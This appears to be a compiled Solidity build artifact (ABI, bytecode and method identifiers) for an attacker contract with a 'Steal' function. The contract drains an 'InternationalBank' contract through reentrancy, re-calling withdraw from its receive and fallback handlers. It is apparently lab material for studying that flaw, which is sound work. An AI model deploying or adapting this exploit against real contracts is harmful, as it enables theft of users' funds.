{"abi":[{"type":"constructor","inputs":[{"name":"p_internationalBankAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"DEPOSIT_AMOUNT","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"Steal","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"getAttackerContractBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"internationalBank","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract InternationalBank"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161037f38038061037f833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b6102f9806100865f395ff3fe608060405260043610610042575f3560e01c80630a7591d514610116578063b432ea361461011e578063c185a73e14610159578063ec6925a714610175576100bb565b366100bb575f54670de0b6b3a76400006001600160a01b0390911631106100b9575f805460408051633821b97b60e21b815290516001600160a01b039092169263e086e5ec9260048084019382900301818387803b1580156100a2575f5ffd5b505af11580156100b4573d5f5f3e3d5ffd5b505050505b005b5f54670de0b6b3a76400006001600160a01b0390911631106100b9575f805460408051633821b97b60e21b815290516001600160a01b039092169263e086e5ec9260048084019382900301818387803b1580156100a2575f5ffd5b6100b9610190565b348015610129575f5ffd5b505f5461013c906001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b348015610164575f5ffd5b50475b604051908152602001610150565b348015610180575f5ffd5b50610167670de0b6b3a764000081565b670de0b6b3a76400003410156102095760405162461bcd60e51b815260206004820152603460248201527f41747461636b6572206465706f73697420616d6f756e742073686f756c64206260448201527332903434b3b432b9103a3430b710189022aa241760611b606482015260840160405180910390fd5b5f80546040805163f6326fb360e01b815290516001600160a01b039092169263f6326fb392670de0b6b3a764000092600480820193929182900301818588803b158015610254575f5ffd5b505af1158015610266573d5f5f3e3d5ffd5b50505f805460408051633821b97b60e21b815290516001600160a01b03909216955063e086e5ec9450600480820194509082900301818387803b1580156102ab575f5ffd5b505af11580156102bd573d5f5f3e3d5ffd5b5050505056fea26469706673582212205bdf24942091bcf902f3abd4353954cf3bf051c9d5095b650c011967d9b3064864736f6c634300081d0033","linkReferences":{}},"methodIdentifiers":{"DEPOSIT_AMOUNT()":"ec6925a7","Steal()":"0a7591d5","getAttackerContractBalance()":"c185a73e","internationalBank()":"b432ea36"},"id":19}